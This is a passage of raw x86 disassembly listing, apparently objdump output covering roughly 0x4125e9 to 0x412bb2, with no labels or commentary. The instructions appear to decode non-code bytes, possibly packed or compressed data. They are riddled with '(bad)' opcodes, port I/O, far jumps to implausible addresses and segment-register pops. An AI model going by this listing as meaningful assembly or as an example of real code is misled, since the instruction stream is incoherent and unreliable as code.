  4125e9:	e6 02                	out    %al,$0x2
  4125eb:	b7 58                	mov    $0x58,%bh
  4125ed:	b2 4d                	mov    $0x4d,%dl
  4125ef:	5c                   	pop    %esp
  4125f0:	b4 74                	mov    $0x74,%ah
  4125f2:	17                   	pop    %ss
  4125f3:	31 15 48 5d 16 4b    	xor    %edx,0x4b165d48
  4125f9:	20 27                	and    %ah,(%edi)
  4125fb:	3b 75 e9             	cmp    -0x17(%ebp),%esi
  4125fe:	d9 a5 1a e3 ef db    	fldenv -0x24101ce6(%ebp)
  412604:	41                   	inc    %ecx
  412605:	26 6c                	es insb (%dx),%es:(%edi)
  412607:	db 5b df             	fistpl -0x21(%ebx)
  41260a:	53                   	push   %ebx
  41260b:	3b 05 7c 7b fa 13    	cmp    0x13fa7b7c,%eax
  412611:	ef                   	out    %eax,(%dx)
  412612:	89 09                	mov    %ecx,(%ecx)
  412614:	82 15 0a b9 48 08 81 	adcb   $0x81,0x848b90a
  41261b:	f9                   	stc
  41261c:	c1 16 4d             	rcll   $0x4d,(%esi)
  41261f:	fc                   	cld
  412620:	ac                   	lods   %ds:(%esi),%al
  412621:	7f 38                	jg     0x41265b
  412623:	6c                   	insb   (%dx),%es:(%edi)
  412624:	17                   	pop    %ss
  412625:	39 79 f6             	cmp    %edi,-0xa(%ecx)
  412628:	07                   	pop    %es
  412629:	62 bf 05 c1 03 c1    	bound  %edi,-0x3efc3efb(%edi)
  41262f:	f9                   	stc
  412630:	02 d4                	add    %ah,%dl
  412632:	cc                   	int3
  412633:	88 f4                	mov    %dh,%ah
  412635:	eb 24                	jmp    0x41265b
  412637:	16                   	push   %ss
  412638:	d6                   	salc
  412639:	d8 5e 5b             	fcomps 0x5b(%esi)
  41263c:	d9 17                	fsts   (%edi)
  41263e:	15 8b 24 05 7b       	adc    $0x7b05248b,%eax
  412643:	cd 4c                	int    $0x4c
  412645:	ed                   	in     (%dx),%eax
  412646:	02 89 40 ad 08 47    	add    0x4708ad40(%ecx),%cl
  41264c:	f8                   	clc
  41264d:	e2 8d                	loop   0x4125dc
  41264f:	8d 73 15             	lea    0x15(%ebx),%esi
  412652:	8c b4 4a ec c1 72 07 	mov    %?,0x772c1ec(%edx,%ecx,2)
  412659:	fa                   	cli
  41265a:	bd 84 5b 36 0c       	mov    $0xc365b84,%ebp
  41265f:	06                   	push   %es
  412660:	cb                   	lret
  412661:	12 81 fa 17 75 e8    	adc    -0x178ae806(%ecx),%al
  412667:	77 bc                	ja     0x412625
  412669:	38 cc                	cmp    %cl,%ah
  41266b:	84 c6                	test   %al,%dh
  41266d:	8d                   	lea    (bad),%eax
  41266e:	c3                   	ret
  41266f:	8b ca                	mov    %edx,%ecx
  412671:	83 f7 f6             	xor    $0xfffffff6,%edi
  412674:	b7 f8                	mov    $0xf8,%bh
  412676:	e9 04 8d 1c 01       	jmp    0x15db37f
  41267b:	8b 10                	mov    (%eax),%edx
  41267d:	7c 0f                	jl     0x41268e
  41267f:	c7 03 07 18 80 8b    	movl   $0x8b801807,(%ebx)
  412685:	d1 b9 7b 5b 6a 6d    	sarl   $1,0x6d6a5b7b(%ecx)
  41268b:	0c f4                	or     $0xf4,%al
  41268d:	4f                   	dec    %edi
  41268e:	13 70 0c             	adc    0xc(%eax),%esi
  412691:	20 81 c9 02 15 fd    	and    %al,-0x2eafd37(%ecx)
  412697:	7b 5b                	jnp    0x4126f4
  412699:	a0 89 d0 0b 12       	mov    0x120bd089,%al
  41269e:	ff 05 1c b7 d0 83    	incl   0x83d0b71c
  4126a4:	ea 04 3d bb db d8 54 	ljmp   $0x54d8,$0xdbbb3d04
  4126ab:	e2 fc                	loop   0x4126a9
  4126ad:	e3 7f                	jecxz  0x41272e
  4126af:	0a 01                	or     (%ecx),%al
  4126b1:	15 20 ef 11 5c       	adc    $0x5c11ef20,%eax
  4126b6:	4f                   	dec    %edi
  4126b7:	4d                   	dec    %ebp
  4126b8:	7f 73                	jg     0x41272d
  4126ba:	3b 36                	cmp    (%esi),%esi
  4126bc:	0c 7c                	or     $0x7c,%al
  4126be:	0e                   	push   %cs
  4126bf:	83 ca 02             	or     $0x2,%edx
  4126c2:	2a c0                	sub    %al,%al
  4126c4:	83 0b 0e             	orl    $0xe,(%ebx)
  4126c7:	fe                   	(bad)
  4126c8:	92                   	xchg   %eax,%edx
  4126c9:	b1 68                	mov    $0x68,%cl
  4126cb:	49                   	dec    %ecx
  4126cc:	0a 03                	or     (%ebx),%al
  4126ce:	c2 83 20             	ret    $0x2083
  4126d1:	fe 07                	incb   (%edi)
  4126d3:	af                   	scas   %es:(%edi),%eax
  4126d4:	70 ba                	jo     0x412690
  4126d6:	60                   	pusha
  4126d7:	47                   	inc    %edi
  4126d8:	18 e1                	sbb    %ah,%cl
  4126da:	08 05 57 7a 06 81    	or     %al,0x81067a57
  4126e0:	74 29                	je     0x41270b
  4126e2:	04 da                	add    $0xda,%al
  4126e4:	53                   	push   %ebx
  4126e5:	63 1c 66             	arpl   %ebx,(%esi,%eiz,2)
  4126e8:	fa                   	cli
  4126e9:	db 2b                	fldt   (%ebx)
  4126eb:	56                   	push   %esi
  4126ec:	c8 33 11 f7          	enter  $0x1133,$0xf7
  4126f0:	c2 fe e1             	ret    $0xe1fe
  4126f3:	1f                   	pop    %ds
  4126f4:	05 c1 f6 16 da       	add    $0xda16f6c1,%eax
  4126f9:	f6 01 d5             	testb  $0xd5,(%ecx)
  4126fc:	20 45 a6             	and    %al,-0x5a(%ebp)
  4126ff:	72 de                	jb     0x4126df
  412701:	99                   	cltd
  412702:	c3                   	ret
  412703:	be 22 c6 3b 70       	mov    $0x703bc622,%esi
  412708:	08 1d 06 7b 0a a4    	or     %bl,0xa40a7b06
  41270e:	03 de                	add    %esi,%ebx
  412710:	5a                   	pop    %edx
  412711:	20 09                	and    %cl,(%ecx)
  412713:	94                   	xchg   %eax,%esp
  412714:	54                   	push   %esp
  412715:	63 e1                	arpl   %esp,%ecx
  412717:	33 6d f1             	xor    -0xf(%ebp),%ebp
  41271a:	fd                   	std
  41271b:	5e                   	pop    %esi
  41271c:	9f                   	lahf
  41271d:	03 a9 00 66 0b 25    	add    0x250b6600(%ecx),%ebp
  412723:	59                   	pop    %ecx
  412724:	03 68 d8             	add    -0x28(%eax),%ebp
  412727:	bd 0a 94 b8 11       	mov    $0x11b8940a,%ebp
  41272c:	a8 02                	test   $0x2,%al
  41272e:	67 fb                	addr16 sti
  412730:	63 14 f8             	arpl   %edx,(%eax,%edi,8)
  412733:	5b                   	pop    %ebx
  412734:	c0 31 4e             	shlb   $0x4e,(%ecx)
  412737:	08 15 83 23 fe 3b    	or     %dl,0x3bfe2383
  41273d:	1d 3b 70 19 af       	sbb    $0xaf19703b,%eax
  412742:	f8                   	clc
  412743:	08 21                	or     %ah,(%ecx)
  412745:	0b 08                	or     (%eax),%ecx
  412747:	6f                   	outsl  %ds:(%esi),(%dx)
  412748:	ae                   	scas   %es:(%edi),%al
  412749:	96                   	xchg   %eax,%esi
  41274a:	ab                   	stos   %eax,%es:(%edi)
  41274b:	46                   	inc    %esi
  41274c:	4c                   	dec    %esp
  41274d:	3e db 7b 8d          	fstpt  %ds:-0x73(%ebx)
  412751:	0c 37                	or     $0x37,%al
  412753:	37                   	aaa
  412754:	d8 6e dd             	fsubrs -0x23(%esi)
  412757:	2b d1                	sub    %ecx,%edx
  412759:	f2 7f c8             	bnd jg 0x412724
  41275c:	f8                   	clc
  41275d:	2b 31                	sub    (%ecx),%esi
  41275f:	c6                   	(bad)
  412760:	a8 83                	test   $0x83,%al
  412762:	f8                   	clc
  412763:	56                   	push   %esi
  412764:	2b 70 e0             	sub    -0x20(%eax),%esi
  412767:	0c 7d                	or     $0x7d,%al
  412769:	12 6a 01             	adc    0x1(%edx),%ch
  41276c:	48                   	dec    %eax
  41276d:	65 0a 74 dd 6d       	or     %gs:0x6d(%ebp,%ebx,8),%dh
  412772:	96                   	xchg   %eax,%esi
  412773:	eb 0f                	jmp    0x412784
  412775:	11 d7                	adc    %edx,%edi
  412777:	ee                   	out    %al,(%dx)
  412778:	8d ac 28 16 0b c7 10 	lea    0x10c70b16(%eax,%ebp,1),%ebp
  41277f:	8b 2c d5 ed b8 ee e4 	mov    -0x1b114713(,%edx,8),%ebp
  412786:	ce                   	into
  412787:	de 91 d5 2b d6 59    	ficoms 0x59d62bd5(%ecx)
  41278d:	38 54 f7 38          	cmp    %dl,0x38(%edi,%esi,8)
  412791:	c5 b7 7d 43 99 c2    	lds    -0x3d66bc83(%edi),%esi
  412797:	73 0a                	jae    0x4127a3
  412799:	8d 14 5d d0 19 8c 13 	lea    0x138c19d0(,%ebx,2),%edx
  4127a0:	68 61 9a ee f7       	push   $0xf7ee9a61
  4127a5:	e6 a5                	out    %al,$0xa5
  4127a7:	2d 4a 3c 78 97       	sub    $0x97783c4a,%eax
  4127ac:	2f                   	das
  4127ad:	88 49 64             	mov    %cl,0x64(%ecx)
  4127b0:	63 eb                	arpl   %ebp,%ebx
  4127b2:	5d                   	pop    %ebp
  4127b3:	38 03                	cmp    %al,(%ebx)
  4127b5:	c6 83 e8 34 70 4d fe 	movb   $0xfe,0x4d7034e8(%ebx)
  4127bc:	26 4b                	es dec %ebx
  4127be:	c7                   	(bad)
  4127bf:	6d                   	insl   (%dx),%es:(%edi)
  4127c0:	37                   	aaa
  4127c1:	7e 85                	jle    0x412748
  4127c3:	d2 4b c2             	rorb   %cl,-0x3e(%ebx)
  4127c6:	fa                   	cli
  4127c7:	97                   	xchg   %eax,%edi
  4127c8:	63 1d b7 4c 90 f4    	arpl   %ebx,0xf4904cb7
  4127ce:	bb 10 0c 89 5c       	mov    $0x5c890c10,%ebx
  4127d3:	89 5b 47             	mov    %ebx,0x47(%ebx)
  4127d6:	5b                   	pop    %ebx
  4127d7:	c7                   	(bad)
  4127d8:	1b 86 1b eb 3a e2    	sbb    -0x1dc514e5(%esi),%eax
  4127de:	43                   	inc    %ebx
  4127df:	08 13                	or     %dl,(%ebx)
  4127e1:	91                   	xchg   %eax,%ecx
  4127e2:	83 4b b7 50          	orl    $0x50,-0x49(%ebx)
  4127e6:	5a                   	pop    %edx
  4127e7:	f6 2c 3e             	imulb  (%esi,%edi,1)
  4127ea:	3c 7c                	cmp    $0x7c,%al
  4127ec:	0d 38 f6 9e b7       	or     $0xb79ef638,%eax
  4127f1:	07                   	pop    %es
  4127f2:	0c 5c                	or     $0x5c,%al
  4127f4:	84 32                	test   %dh,(%edx)
  4127f6:	17                   	pop    %ss
  4127f7:	a1 7c 1d 05 2d       	mov    0x2d051d7c,%eax
  4127fc:	4f                   	dec    %edi
  4127fd:	d7                   	xlat   %ds:(%ebx)
  4127fe:	0c 06                	or     $0x6,%al
  412800:	bb 1e 80 7e 38       	mov    $0x387e801e,%ebx
  412805:	26 6c                	es insb (%dx),%es:(%edi)
  412807:	b3 40                	mov    $0x40,%bl
  412809:	08 fc                	or     %bh,%ah
  41280b:	0c 82                	or     $0x82,%al
  41280d:	4b                   	dec    %ebx
  41280e:	76 6e                	jbe    0x41287e
  412810:	fc                   	cld
  412811:	6e                   	outsb  %ds:(%esi),(%dx)
  412812:	89 2b                	mov    %ebp,(%ebx)
  412814:	a1 13 83 c8 b8       	mov    0xb8c88313,%eax
  412819:	15 84 8b 7b a6       	adc    $0xa67b8b84,%eax
  41281e:	61                   	popa
  41281f:	bc 06 18 ae 0e       	mov    $0xeae1806,%esp
  412824:	06                   	push   %es
  412825:	85 c2                	test   %eax,%edx
  412827:	0c 9e                	or     $0x9e,%al
  412829:	25 77 6a 66 0d       	and    $0xd666a77,%eax
  41282e:	6c                   	insb   (%dx),%es:(%edi)
  41282f:	b0 c1                	mov    $0xc1,%al
  412831:	f0 8d 9e a5 9d fc 34 	lock lea 0x34fc9da5(%esi),%ebx
  412838:	0d 94 01 69 9a       	or     $0x9a690194,%eax
  41283d:	7c 08                	jl     0x412847
  41283f:	8c 08                	mov    %cs,(%eax)
  412841:	0a ff                	or     %bh,%bh
  412843:	fc                   	cld
  412844:	23 3a                	and    (%edx),%edi
  412846:	52                   	push   %edx
  412847:	8b 07                	mov    (%edi),%eax
  412849:	3b d8                	cmp    %eax,%ebx
  41284b:	73 0a                	jae    0x412857
  41284d:	b4 29                	mov    $0x29,%ah
  41284f:	07                   	pop    %es
  412850:	01 47 39             	add    %eax,0x39(%edi)
  412853:	2c b4                	sub    $0xb4,%al
  412855:	d8 35 f2 04 f3 03    	fdivs  0x3f304f2
  41285b:	d1 3e                	sarl   $1,(%esi)
  41285d:	c6                   	(bad)
  41285e:	74 34                	je     0x412894
  412860:	ec                   	in     (%dx),%al
  412861:	2b 16                	sub    (%esi),%edx
  412863:	c1 24 16 79          	shll   $0x79,(%esi,%edx,1)
  412867:	11 dc                	adc    %ebx,%esp
  412869:	23 3c 2e             	and    (%esi,%ebp,1),%edi
  41286c:	23 04 ba             	and    (%edx,%edi,4),%eax
  41286f:	58                   	pop    %eax
  412870:	6c                   	insb   (%dx),%es:(%edi)
  412871:	83 6f 04 19          	subl   $0x19,0x4(%edi)
  412875:	5b                   	pop    %ebx
  412876:	21 d6                	and    %edx,%esi
  412878:	c6 81 8b 1e 82 5c 7e 	movb   $0x7e,0x5c821e8b(%ecx)
  41287f:	10 da                	adc    %bl,%dl
  412881:	33 1a                	xor    (%edx),%ebx
  412883:	12 93 c8 d4 8d f0    	adc    -0xf722b38(%ebx),%dl
  412889:	7d 37                	jge    0x4128c2
  41288b:	ce                   	into
  41288c:	26 32 06             	xor    %es:(%esi),%al
  41288f:	c0 35 8b c4 94 c8 c4 	shlb   $0xc4,0xc894c48b
  412896:	e0 30                	loopne 0x4128c8
  412898:	18 74 02 8d          	sbb    %dh,-0x73(%edx,%eax,1)
  41289c:	0b 5d b3             	or     -0x4d(%ebp),%ebx
  41289f:	c4 49 bd             	les    -0x43(%ecx),%ecx
  4128a2:	d8 51 8d             	fcoms  -0x73(%ecx)
  4128a5:	c3                   	ret
  4128a6:	30 07                	xor    %al,(%edi)
  4128a8:	50                   	push   %eax
  4128a9:	9a a5 90 50 5f 81 e9 	lcall  $0xe981,$0x5f5090a5
  4128b0:	e3 a5                	jecxz  0x412857
  4128b2:	a1 8e a1 c0 f8       	mov    0xf8c0a18e,%eax
  4128b7:	02 3d ee 7f a8 08    	add    0x8a87fee,%bh
  4128bd:	bc 1c 61 15 a9       	mov    $0xa915611c,%esp
  4128c2:	54                   	push   %esp
  4128c3:	82 d2 75             	adc    $0x75,%dl
  4128c6:	08 5d 0f             	or     %bl,0xf(%ebp)
  4128c9:	c7                   	(bad)
  4128ca:	c8 34 ea a8          	enter  $0xea34,$0xa8
  4128ce:	63 f0                	arpl   %esi,%eax
  4128d0:	bf 81 bd 09 13       	mov    $0x1309bd81,%edi
  4128d5:	66 ac                	data16 lods %ds:(%esi),%al
  4128d7:	80 e0 74             	and    $0x74,%al
  4128da:	76 71                	jbe    0x41294d
  4128dc:	1e                   	push   %ds
  4128dd:	47                   	inc    %edi
  4128de:	ea 69 84 27 1f 6b 7e 	ljmp   $0x7e6b,$0x1f278469
  4128e5:	7b 0a                	jnp    0x4128f1
  4128e7:	ad                   	lods   %ds:(%esi),%eax
  4128e8:	d0 d6                	rcl    $1,%dh
  4128ea:	15 d6 17 7f 8d       	adc    $0x8d7f17d6,%eax
  4128ef:	17                   	pop    %ss
  4128f0:	2d 13 63 0c c6       	sub    $0xc60c6313,%eax
  4128f5:	b7 1f                	mov    $0x1f,%bh
  4128f7:	27                   	daa
  4128f8:	89 1f                	mov    %ebx,(%edi)
  4128fa:	eb 63                	jmp    0x41295f
  4128fc:	15 0d 66 0e d2       	adc    $0xd20e660d,%eax
  412901:	9d                   	popf
  412902:	35 b4 b4 a7 40       	xor    $0x40a7b4b4,%eax
  412907:	4e                   	dec    %esi
  412908:	0c 54                	or     $0x54,%al
  41290a:	99                   	cltd
  41290b:	07                   	pop    %es
  41290c:	c3                   	ret
  41290d:	ed                   	in     (%dx),%eax
  41290e:	f6 ae a7 0f cf 3b    	imulb  0x3bcf0fa7(%esi)
  412914:	75 23                	jne    0x412939
  412916:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  412917:	29 04 83             	sub    %eax,(%ebx,%eax,4)
  41291a:	7d c6                	jge    0x4128e2
  41291c:	08 3b                	or     %bh,(%ebx)
  41291e:	68 0d 83 08 62       	push   $0x6208830d
  412923:	45                   	inc    %ebp
  412924:	00 b2 59 43 1a e1    	add    %dh,-0x1ee5bca7(%edx)
  41292a:	01 35 27 d6 d8 09    	add    %esi,0x9d8d627
  412930:	9c                   	pushf
  412931:	de 67 e9             	fisubs -0x17(%edi)
  412934:	83 ee fc             	sub    $0xfffffffc,%esi
  412937:	35 eb 4c f4 3d       	xor    $0x3df44ceb,%eax
  41293c:	5d                   	pop    %ebp
  41293d:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  41293e:	52                   	push   %edx
  41293f:	6b bb af 8a 04 3b d3 	imul   $0xffffffd3,0x3b048aaf(%ebx),%edi
  412946:	56                   	push   %esi
  412947:	28 10                	sub    %dl,(%eax)
  412949:	eb 03                	jmp    0x41294e
  41294b:	d6                   	salc
  41294c:	92                   	xchg   %eax,%edx
  41294d:	4c                   	dec    %esp
  41294e:	8a 1c 8b             	mov    (%ebx,%ecx,4),%bl
  412951:	d7                   	xlat   %ds:(%ebx)
  412952:	a3 63 a9 ce 8b       	mov    %eax,0x8bcea963
  412957:	3c 07                	cmp    $0x7,%al
  412959:	ac                   	lods   %ds:(%esi),%al
  41295a:	00 60 30             	add    %ah,0x30(%eax)
  41295d:	85 35 06 4d 5d d3    	test   %esi,0xd35d4d06
  412963:	05 83 48 86 54       	add    $0x54864883,%eax
  412968:	b5 16                	mov    $0x16,%ch
  41296a:	76 5f                	jbe    0x4129cb
  41296c:	b3 2b                	mov    $0x2b,%bl
  41296e:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  41296f:	b0 09                	mov    $0x9,%al
  412971:	00 0a                	add    %cl,(%edx)
  412973:	98                   	cwtl
  412974:	fc                   	cld
  412975:	b3 11                	mov    $0x11,%bl
  412977:	4f                   	dec    %edi
  412978:	96                   	xchg   %eax,%esi
  412979:	e7 06                	out    %eax,$0x6
  41297b:	0d 89 25 4c 21       	or     $0x214c2589,%eax
  412980:	31 21                	xor    %esp,(%ecx)
  412982:	b7 4a                	mov    $0x4a,%bh
  412984:	1c 40                	sbb    $0x40,%al
  412986:	83 c3 25             	add    $0x25,%ebx
  412989:	45                   	inc    %ebp
  41298a:	83 fb 0f             	cmp    $0xf,%ebx
  41298d:	0d 0c 6f d1 05       	or     $0x5d16f0c,%eax
  412992:	bb 0c 2c 02 0b       	mov    $0xb022c0c,%ebx
  412997:	0f 08                	invd
  412999:	4b                   	dec    %ebx
  41299a:	88 d1                	mov    %dl,%cl
  41299c:	8f                   	(bad)
  41299d:	93                   	xchg   %eax,%ebx
  41299e:	cc                   	int3
  41299f:	83 7c f0 35 d5       	cmpl   $0xffffffd5,0x35(%eax,%esi,8)
  4129a4:	1e                   	push   %ds
  4129a5:	74 79                	je     0x412a20
  4129a7:	af                   	scas   %es:(%edi),%eax
  4129a8:	12 c3                	adc    %bl,%al
  4129aa:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4129ab:	42                   	inc    %edx
  4129ac:	8a c0                	mov    %al,%al
  4129ae:	84 bd 4f d0 75 1a    	test   %bh,0x1a75d04f(%ebp)
  4129b4:	29 0d 9c 40 a0 ab    	sub    %ecx,0xaba0409c
  4129ba:	37                   	aaa
  4129bb:	20 7c 81 f4          	and    %bh,-0xc(%ecx,%eax,4)
  4129bf:	9d                   	popf
  4129c0:	cb                   	lret
  4129c1:	9e                   	sahf
  4129c2:	ad                   	lods   %ds:(%esi),%eax
  4129c3:	f0 72 64             	lock jb 0x412a2a
  4129c6:	3d 44 8f 0a 89       	cmp    $0x890a8f44,%eax
  4129cb:	4d                   	dec    %ebp
  4129cc:	83 02 d8             	addl   $0xffffffd8,(%edx)
  4129cf:	4d                   	dec    %ebp
  4129d0:	b9 47 2d 05 60       	mov    $0x60052d47,%ecx
  4129d5:	8b 52 08             	mov    0x8(%edx),%edx
  4129d8:	ee                   	out    %al,(%dx)
  4129d9:	b2 c0                	mov    $0xc0,%dl
  4129db:	60                   	pusha
  4129dc:	6e                   	outsb  %ds:(%esi),(%dx)
  4129dd:	bb f1 eb 3c 1d       	mov    $0x1d3cebf1,%ebx
  4129e2:	d8 0f                	fmuls  (%edi)
  4129e4:	c7                   	(bad)
  4129e5:	0e                   	push   %cs
  4129e6:	1f                   	pop    %ds
  4129e7:	68 cf 3b 1d e0       	push   $0xe01d3bcf
  4129ec:	7f 4a                	jg     0x412a38
  4129ee:	29 07                	sub    %eax,(%edi)
  4129f0:	0c e9                	or     $0xe9,%al
  4129f2:	3d a4 53 0d 03       	cmp    $0x30d53a4,%eax
  4129f7:	0e                   	push   %cs
  4129f8:	29 0e                	sub    %ecx,(%esi)
  4129fa:	65 23 27             	and    %gs:(%edi),%esp
  4129fd:	91                   	xchg   %eax,%ecx
  4129fe:	1d d3 54 eb 32       	sbb    $0x32eb54d3,%eax
  412a03:	9c                   	pushf
  412a04:	24 dc                	and    $0xdc,%al
  412a06:	11 99 0e e0 1f 91    	adc    %ebx,-0x6ee01ff2(%ecx)
  412a0c:	53                   	push   %ebx
  412a0d:	21 6c 86 36          	and    %ebp,0x36(%esi,%eax,4)
  412a11:	91                   	xchg   %eax,%ecx
  412a12:	8b 2a                	mov    (%edx),%ebp
  412a14:	81 2a 5d d3 45 68    	subl   $0x6845d35d,(%edx)
  412a1a:	78 a7                	js     0x4129c3
  412a1c:	87 51 85             	xchg   %edx,-0x7b(%ecx)
  412a1f:	7c 2c                	jl     0x412a4d
  412a21:	93                   	xchg   %eax,%ebx
  412a22:	0e                   	push   %cs
  412a23:	39 04 8c             	cmp    %eax,(%esp,%ecx,4)
  412a26:	1f                   	pop    %ds
  412a27:	16                   	push   %ss
  412a28:	ef                   	out    %eax,(%dx)
  412a29:	cf                   	iret
  412a2a:	86 d7                	xchg   %dl,%bh
  412a2c:	9a 08 c7 38 06 98 12 	lcall  $0x1298,$0x638c708
  412a33:	f5                   	cmc
  412a34:	f2 6f                	repnz outsl %ds:(%esi),(%dx)
  412a36:	28 05 92 22 a7 f0    	sub    %al,0xf0a72292
  412a3c:	8b 1e                	mov    (%esi),%ebx
  412a3e:	f6 c3 3d             	test   $0x3d,%bl
  412a41:	d8 d9                	fcomp  %st(1)
  412a43:	02 7d 0f             	add    0xf(%ebp),%bh
  412a46:	42                   	inc    %edx
  412a47:	09 3b                	or     %edi,(%ebx)
  412a49:	c5 ff 0d             	(bad)
  412a4c:	b7 29                	mov    $0x29,%bh
  412a4e:	02 ed                	add    %ch,%ch
  412a50:	c8 b8 a3 b4          	enter  $0xa3b8,$0xb4
  412a54:	29 05 cf 12 af 0b    	sub    %eax,0xbaf12cf
  412a5a:	b4 29                	mov    $0x29,%ah
  412a5c:	ee                   	out    %al,(%dx)
  412a5d:	45                   	inc    %ebp
  412a5e:	8b e8                	mov    %eax,%ebp
  412a60:	39 3b                	cmp    %edi,(%ebx)
  412a62:	d0 fa                	sar    $1,%dl
  412a64:	c1 08 66             	rorl   $0x66,(%eax)
  412a67:	08 f7                	or     %dh,%bh
  412a69:	df cb                	(bad)
  412a6b:	3e 6d                	ds insl (%dx),%es:(%edi)
  412a6d:	03 43 06             	add    0x6(%ebx),%eax
  412a70:	0a 86 c2 3b 22 31    	or     0x31223bc2(%esi),%al
  412a76:	1a 30                	sbb    (%eax),%dh
  412a78:	65 17                	gs pop %ss
  412a7a:	03 0b                	add    (%ebx),%ecx
  412a7c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  412a7d:	bc c0 61 06 56       	mov    $0x560661c0,%esp
  412a82:	e1 40                	loope  0x412ac4
  412a84:	3b 3d 84 7a 98 50    	cmp    0x50987a84,%edi
  412a8a:	36 70 75             	ss jo  0x412b02
  412a8d:	2c 55                	sub    $0x55,%al
  412a8f:	60                   	pusha
  412a90:	81 18 b1 ba ce d3    	sbbl   $0xd3cebab1,(%eax)
  412a96:	3c d6                	cmp    $0xd6,%al
  412a98:	05 84 6f f8 05       	add    $0x5f86f84,%eax
  412a9d:	de 84 a4 db 06 f6 c2 	fiadds -0x3d09f925(%esp,%eiz,4)
  412aa4:	02 74 1c 39          	add    0x39(%esp,%ebx,1),%dh
  412aa8:	2c 07                	sub    $0x7,%al
  412aaa:	93                   	xchg   %eax,%ebx
  412aab:	01 dd                	add    %ebx,%ebp
  412aad:	f3 0b c8             	repz or %eax,%ecx
  412ab0:	f4                   	hlt
  412ab1:	02 ff                	add    %bh,%bh
  412ab3:	37                   	aaa
  412ab4:	83 08 01             	orl    $0x1,(%eax)
  412ab7:	eb 29                	jmp    0x412ae2
  412ab9:	3f                   	aas
  412aba:	83 78 04 ff          	cmpl   $0xffffffff,0x4(%eax)
  412abe:	73 13                	jae    0x412ad3
  412ac0:	76 fb                	jbe    0x412abd
  412ac2:	5c                   	pop    %esp
  412ac3:	06                   	push   %es
  412ac4:	0a 08                	or     (%eax),%cl
  412ac6:	0c 23                	or     $0x23,%al
  412ac8:	13 c1                	adc    %ecx,%eax
  412aca:	8d af e9 74 52 31    	lea    0x315274e9(%edi),%ebp
  412ad0:	d3 88 24 a1 1d 0e    	rorl   %cl,0xe1da124(%eax)
  412ad6:	40                   	inc    %eax
  412ad7:	1e                   	push   %ds
  412ad8:	08 a5 f9 22 5d d9    	or     %ah,-0x26a2dd07(%ebp)
  412ade:	d8 95 a4 af 81 83    	fcoms  -0x7c7e505c(%ebp)
  412ae4:	c6                   	(bad)
  412ae5:	ec                   	in     (%dx),%al
  412ae6:	e6 d4                	out    %al,$0xd4
  412ae8:	c2 9f 66             	ret    $0x669f
  412aeb:	fe                   	(bad)
  412aec:	be 8b e8 83 ed       	mov    $0xed83e88b,%esi
  412af1:	63 7d fd             	arpl   %edi,-0x3(%ebp)
  412af4:	c2 42 cc             	ret    $0xcc42
  412af7:	b7 f0                	mov    $0xf0,%bh
  412af9:	01 c7                	add    %eax,%edi
  412afb:	c7                   	(bad)
  412afc:	3b fe                	cmp    %esi,%edi
  412afe:	0f 8c 83 6b 38 5a    	jl     0x5a799687
  412b04:	ea 1b a3 d6 bc 70 ff 	ljmp   $0xff70,$0xbcd6a31b
  412b0b:	dd 2b                	(bad) (%ebx)
  412b0d:	38 1a                	cmp    %bl,(%edx)
  412b0f:	38 df                	cmp    %bl,%bh
  412b11:	66 0a 08             	data16 or (%eax),%cl
  412b14:	01 00                	add    %eax,(%eax)
  412b16:	05 06 8c 05 7c       	add    $0x7c058c06,%eax
  412b1b:	0f 81 ee c8 61 af    	jno    0xafa2f40f
  412b21:	f8                   	clc
  412b22:	15 1e 29 8b f7       	adc    $0xf78b291e,%eax
  412b27:	88 ad 73 c1 db 14    	mov    %ch,0x14dbc173(%ebp)
  412b2d:	af                   	scas   %es:(%edi),%eax
  412b2e:	50                   	push   %eax
  412b2f:	f6 03 02             	testb  $0x2,(%ebx)
  412b32:	27                   	daa
  412b33:	d2 01                	rolb   %cl,(%ecx)
  412b35:	4e                   	dec    %esi
  412b36:	13 2f                	adc    (%edi),%ebp
  412b38:	b8 62 d3 fa 9d       	mov    $0x9dfad362,%eax
  412b3d:	1b 8b dd 7d 08 b4    	sbb    -0x4bf78223(%ebx),%ecx
  412b43:	0d 34 2d fd 89       	or     $0x89fd2d34,%eax
  412b48:	03 1e                	add    (%esi),%ebx
  412b4a:	f4                   	hlt
  412b4b:	a3 86 d9 6c 34       	mov    %eax,0x346cd986
  412b50:	3b a8 c7 e9 76 63    	cmp    0x6376e9c7(%eax),%ebp
  412b56:	30 d8                	xor    %bl,%al
  412b58:	83 67 2d 3b          	andl   $0x3b,0x2d(%edi)
  412b5c:	10 7c 53 a4          	adc    %bh,-0x5c(%ebx,%edx,2)
  412b60:	f7 66 a7             	mull   -0x59(%esi)
  412b63:	c1 67 09 7a          	shll   $0x7a,0x9(%edi)
  412b67:	0d 40 7a 16 bb       	or     $0xbb167a40,%eax
  412b6c:	18 27                	sbb    %ah,(%edi)
  412b6e:	13 03                	adc    (%ebx),%eax
  412b70:	35 18 c7 d6 db       	xor    $0xdbd6c718,%eax
  412b75:	5e                   	pop    %esi
  412b76:	4f                   	dec    %edi
  412b77:	16                   	push   %ss
  412b78:	20 09                	and    %cl,(%ecx)
  412b7a:	b7 25                	mov    $0x25,%bh
  412b7c:	1b 8b f0 19 f8 0b    	sbb    0xbf819f0(%ebx),%ecx
  412b82:	f0 89 75 d6          	lock mov %esi,-0x2a(%ebp)
  412b86:	6d                   	insl   (%dx),%es:(%edi)
  412b87:	c8 c9 94 95          	enter  $0x94c9,$0x95
  412b8b:	a1 86 af df b0       	mov    0xb0dfaf86,%eax
  412b90:	4d                   	dec    %ebp
  412b91:	77 c2                	ja     0x412b55
  412b93:	7e 1a                	jle    0x412baf
  412b95:	b0 a9                	mov    $0xa9,%al
  412b97:	ed                   	in     (%dx),%eax
  412b98:	e3 02                	jecxz  0x412b9c
  412b9a:	3b 99 7d 0e 82 a1    	cmp    -0x5e7df183(%ecx),%ebx
  412ba0:	84 7b 2d             	test   %bh,0x2d(%ebx)
  412ba3:	72 df                	jb     0x412b84
  412ba5:	71 0b                	jno    0x412bb2
  412ba7:	9d                   	popf
  412ba8:	c9                   	leave
  412ba9:	f0 b9 37 86 c3 d0    	lock mov $0xd0c38637,%ecx
  412baf:	0e                   	push   %cs
  412bb0:	3f                   	aas
  412bb1:	c6                   	(bad)
  412bb2:	bc 52 bf 5e e2       	mov    $0xe25ebf52,%esp
